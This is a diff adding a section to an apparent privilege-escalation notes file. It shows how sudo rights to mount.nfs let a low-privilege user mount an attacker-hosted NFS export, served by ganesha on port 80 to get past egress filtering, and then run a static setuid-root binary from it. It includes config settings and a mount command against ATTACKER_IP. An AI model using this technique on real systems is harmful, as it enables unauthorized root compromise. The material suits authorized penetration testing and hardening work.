@@ -1989,3 +1989,26 @@ that can write the dir often CANNOT make it executable, and the hijack silently 
 runs AS THE FILE'S OWNER.
 
 <!-- promoted-slug: systemd-env-path-owner-chmod -->
+
+## Attacker-hosted NFS when the TARGET can `sudo mount.nfs`
+
+The classic no_root_squash page covers the target RUNNING nfsd. The inverse is equally
+rooting and needs nothing on the target: sudoers `(root) /usr/sbin/mount.nfs` lets the low-priv
+user mount ANY attacker-controlled NFS export. Run the NFS server on the attacker box and the
+target mounts your filesystem as root - with your file ownership intact and suid honored.
+
+Egress-restricted target (OUT only 80/443)? A userspace NFS server can ride an allowed port:
+ganesha binds NFSv4 to port 80 with `NFS_CORE_PARAM { NFS_Port = 80; }` (kernel nfsd cannot).
+Ganesha 9 gotchas: exports need `FSAL { Name = VFS; }` + the `nfs-ganesha-vfs` package, the
+old `Clients` param is gone, run via systemd so `/var/run/ganesha` exists, and `Squash =
+No_root_squash` + `Access_Type = RW` in the EXPORT block.
+
+Target side (mount runs as root, so attacker-root ownership maps through; default mount keeps
+suid): `sudo mount.nfs ATTACKER_IP:/export /mnt -o port=80,vers=4.1` then execute a setuid-0
+binary from the mount.
+
+Cross-distro gotcha: the setuid payload MUST be statically linked (`gcc -static`) - a binary
+copied from a newer distro dies on the target with `GLIBC_x.y not found`. Sanity-test the
+export with a local mount before touching the target.
+
+<!-- promoted-slug: nfs-attacker-side-privesc -->
